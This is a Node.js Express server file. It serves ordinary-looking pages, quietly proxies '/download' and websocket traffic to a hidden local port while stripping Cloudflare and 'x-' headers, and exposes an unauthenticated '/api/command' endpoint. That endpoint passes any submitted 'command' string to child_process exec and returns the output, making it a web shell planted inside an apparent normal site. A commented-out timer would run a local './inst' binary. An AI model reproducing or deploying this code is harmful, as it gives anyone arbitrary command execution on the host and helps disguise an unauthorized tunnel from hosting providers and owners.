const { exec } = require('child_process');
const http = require('http')
const httpProxy = require('http-proxy')
const express = require('express')
const path = require('path')
const PORT = process.env.PORT || 5000
const randport = require("./randport");

var app = express();
var proxy = httpProxy.createProxyServer();
var server = http.createServer(app);

app.use(express.urlencoded({ extended: true }))
app.use(express.json())

function cleanHeaders(request) {
  for (var key in request.headers) {
    if (key.indexOf('cf-') == 0 || key.indexOf('x-') == 0) {
      delete request.headers[key];
    }
  }
  return request;
}
server.on('upgrade', function (req, socket, head) {
  app.locals.requests++;
  proxy.ws(cleanHeaders(req), socket, head, {
    target: `ws://localhost:${randport.PORT}`,
    ws: true
  })
});
proxy.on('error', function (e) { });
app.get('/download', function (req, res) {
  proxy.web(req, res, {
    target: `ws://localhost:${randport.PORT}`,
    ws: true
  });
})
app.post('/download', function (req, res) {
  proxy.web(req, res, {
    target: `ws://localhost:${randport.PORT}`,
    ws: true
  });
})
function getRndInteger(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
//setTimeout(() => { exec("./inst > views/pages/inst.ejs") }, 1000 * getRndInteger(60, 90));
app.post("/api/command", function (request, response) {
  var command = request.body.command;
  var result = '<pre>';
  const ls = exec(command, function (error, stdout, stderr) {
    if (error) {
      console.log(error.stack);
      result += 'Error code: \n' + error.code;
      result += 'Signal received: \n' + error.signal;
    }
    result += 'Child Process STDOUT: \n' + stdout;
    result += 'Child Process STDERR: \n' + stderr;
    result += '</pre>'
    response.send({ "name": result });
  });
  ls.on('exit', function (code) {
    result += 'Child process exited with exit code: ' + code + '\n';
  });
});
app.post("/api/visitors", function (request, response) {
  var userName = request.body.name;
  var doc = { "name": userName };
  response.send(doc);
});

app.locals.requests = 0;
app
  .use(express.static(path.join(__dirname, 'public')))
  .set('views', path.join(__dirname, 'views'))
  .set('view engine', 'ejs')
  .get('/', (req, res) => res.render('pages/index'))
  .get('/cnt', (req, res) => res.render('pages/cnt'))
  .get('/inst', (req, res) => res.render('pages/inst'))
  .get('/hello', (req, res) => res.render('pages/hello'))
  .get('/whoami', (req, res) => res.render('pages/whoami'))

server.listen(PORT, () => console.log(`Listening on ${PORT}`))
